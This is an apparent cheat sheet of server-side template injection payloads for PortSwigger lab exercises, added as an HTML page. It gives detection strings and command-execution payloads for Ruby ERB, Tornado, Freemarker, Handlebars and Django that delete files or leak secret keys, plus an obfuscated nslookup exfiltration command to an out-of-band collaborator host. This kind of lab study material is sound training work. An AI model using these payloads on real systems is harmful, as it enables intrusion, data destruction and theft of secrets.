@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>SSTI</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header id="title-block-header">
+</header>
+<h1 id="server-side-template-injection">Server-Side Template
+Injection</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><p><a href="#recon">Recon for Server-Side Template
+Injection</a></p></li>
+<li><p><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
+Payloads</a></p></li>
+<li><p>Additional Note: There is a PDF attached in this folder that has
+a walk-through of the labs. The document does not need to be downloaded,
+it can be viewed inline in GitHub.</p></li>
+</ul>
+<p><br><br></p>
+<h2 id="recon">Recon</h2>
+<ul>
+<li><p>Detect and identify server-side template injection:</p>
+<ul>
+<li>https://portswigger.net/web-security/server-side-template-injection#constructing-a-server-side-template-injection-attack</li>
+</ul></li>
+<li><p>Some payloads to try:</p>
+<ul>
+<li><p>{{7*7}}</p></li>
+<li><p>${7*7}</p></li>
+<li><p>&lt;%=7*7%&gt;</p></li>
+<li><p>${7*test}</p></li>
+<li><p>{{this}}{{self}}</p></li>
+<li><p>${{&lt;%[%’“}}%<br />
+</p></li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<p><br><br></p>
+<p>PayloadAllTheThings:</p>
+<ul>
+<li><p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#filter-bypasses</p></li>
+<li><p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</p></li>
+</ul>
+<p><br></p>
+<p><strong>For more Obfuscation related payloads check out the “Command
+Injection” folder of this cheatsheet.</strong></p>
+<p><br></p>
+<p>Obfuscation example (this can be helpful to bypass filtering):</p>
+<p>This will append the String “hello” to Burp Collaborator. This can be
+changed to exfiltrate data.</p>
+<pre><code>&lt;%system(&quot;nslookup $(e`echo ch`o hello).yvxfjnpedf14.oastify.com&quot;)%&gt;</code></pre>
+<p><br><br></p>
+<h3 id="basic-server-side-template-injection"><strong>Basic Server-side
+Template Injection</strong></h3>
+<ul>
+<li><p>Ruby ERB Template Syntax</p>
+<ul>
+<li>Payload: &lt;%=7*7%&gt;</li>
+</ul></li>
+<li><p>If the payload was successful, then in the response we should see
+the value of 49.</p></li>
+<li><p>The following payload can be used to execute an OS command that
+deletes a file from the server:</p>
+<ul>
+<li>Payload:</li>
+</ul></li>
+</ul>
+<pre><code>&lt;%system(&quot;rm /home/carlos/morale.txt&quot;)%&gt;</code></pre>
+<ul>
+<li><p>Other payloads for enumeration:</p>
+<ul>
+<li><p>{{7*7}}</p></li>
+<li><p>${7*7}</p></li>
+</ul></li>
+<li><p>Resources:</p>
+<ul>
+<li><p>https://docs.ruby-lang.org/en/2.3.0/ERB.html</p></li>
+<li><p>https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html</p></li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h3 id="basic-server-side-template-injection-code-context"><strong>Basic
+Server-side Template Injection (Code Context)</strong></h3>
+<ul>
+<li><p>Tornado web Template Engine</p></li>
+<li><p>Try to trigger an error message in the application. Sometimes the
+application will disclose the template that it is using.</p></li>
+<li><p>Some payloads to try:</p>
+<ul>
+<li><p>{{7*7}}</p></li>
+<li><p>${7*7}</p></li>
+</ul></li>
+<li><p>The syntax needs to be valid for successfully execution of the
+payload:</p>
+<ul>
+<li>Payload: }}{{7*7</li>
+</ul></li>
+<li><p>This payload will return the value of 49.</p></li>
+<li><p>The following payload can be used to execute an OS command that
+deletes a file from the server:</p>
+<ul>
+<li>Payload:</li>
+</ul></li>
+</ul>
+<pre><code>}}{%import+os%}{{os.system(&quot;rm+/home/carlos/morale.txt&quot;)</code></pre>
+<ul>
+<li><p>Resources:</p>
+<ul>
+<li>https://www.tornadoweb.org/en/stable/template.html</li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h3
+id="server-side-template-injection-using-documentation"><strong>Server-side
+Template Injection Using Documentation</strong></h3>
+<ul>
+<li><p>Freemarker Template Engine</p></li>
+<li><p>Trigger an overly verbose error message on the application, which
+discloses the template engine in use.</p>
+<ul>
+<li>${7*test}</li>
+</ul></li>
+<li><p>The following payload can be used to execute an OS command that
+deletes a file from the server:</p>
+<ul>
+<li>Payload: &lt;#assign
+ex=“freemarker.template.utility.Execute”?new()&gt; ${ ex(“rm
+/home/carlos/morale.txt”) }</li>
+</ul></li>
+<li><p>Resources:</p>
+<ul>
+<li><p>https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security</p></li>
+<li><p>https://portswigger.net/research/server-side-template-injection</p></li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h3
+id="server-side-template-injection-with-a-documented-exploit"><strong>Server-side
+Template Injection with a Documented Exploit</strong></h3>
+<ul>
+<li><p>Handlebars Template Engine</p></li>
+<li><p>Resource:</p>
+<ul>
+<li>http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html</li>
+</ul></li>
+<li><p>Identification Payload:</p>
+<ul>
+<li>{{this}}{{self}}</li>
+</ul></li>
+<li><p>Using the payload mentioned in the resource, swap out the
+following line of code:</p>
+<ul>
+<li>return JSON.stringify(process.env);</li>
+</ul></li>
+<li><p>Then inject either of the following payloads in its place, then
+URL encode the entire payload String before submitting the payload back
+to the application:</p>
+<ul>
+<li><p>return require(‘child_process’).execSync(‘rm
+/home/carlos/morale.txt’);</p></li>
+<li><p>return require(‘child_process’).exec(‘rm
+/home/carlos/morale.txt’);</p></li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h3
+id="server-side-template-injection-with-information-disclosure-via-user-supplied-objects"><strong>Server-side
+Template Injection with Information Disclosure via User-supplied
+Objects</strong></h3>
+<ul>
+<li><p>Django Template Engine</p></li>
+<li><p>Payload to disclose debug information:</p>
+<ul>
+<li>{% debug %}</li>
+</ul></li>
+<li><p>The “settings” Object can be used to retrieve sensitive
+information from the template engine configuration.</p>
+<ul>
+<li>Payload: {{settings.SECRET_KEY}}</li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h3
+id="server-side-template-injection-in-a-sandboxed-environment"><strong>Server-side
+template injection in a sandboxed environment</strong></h3>
+<ul>
+<li>See lab/document information. -
+https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment</li>
+</ul>
+<p><br><br></p>
+<h3
+id="server-side-template-injection-with-a-custom-exploit"><strong>Server-side
+template injection with a custom exploit</strong></h3>
+<ul>
+<li>See lab/document information. -
+https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit</li>
+</ul>
+<p><br><br></p>
+<h3
+id="pending-to-complete-labs-that-are-missing-from-cheat-sheet"><strong>Pending
+to complete labs that are missing from cheat sheet:</strong></h3>
+<ul>
+<li>All labs in this category are completed and referenced in cheat
+sheet or attached document.</li>
+</ul>
+</body>
+</html>
